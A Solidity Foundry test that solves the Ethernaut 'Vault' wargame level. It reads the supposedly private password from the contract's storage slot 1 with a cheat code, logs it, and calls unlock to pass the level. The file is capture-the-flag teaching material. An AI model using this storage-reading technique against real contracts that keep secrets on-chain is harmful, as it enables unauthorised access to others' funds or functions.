pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Loads a storage slot from an address
  function load(address account, bytes32 slot) external returns (bytes32);
}

contract VaultTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        cheats.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Cheat code to load contract storage at specific slot
        bytes32 password = cheats.load(levelAddress, bytes32(uint256(1)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(password)); 


        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
        uint8 i = 0;

        while(i < 32 && password[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && password[i] != 0; i++) {
            bytesArray[i] = password[i];
        }

        emit log_string(string(bytesArray));

        // Call the unlock function with the password we read from storage
        ethernautVault.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}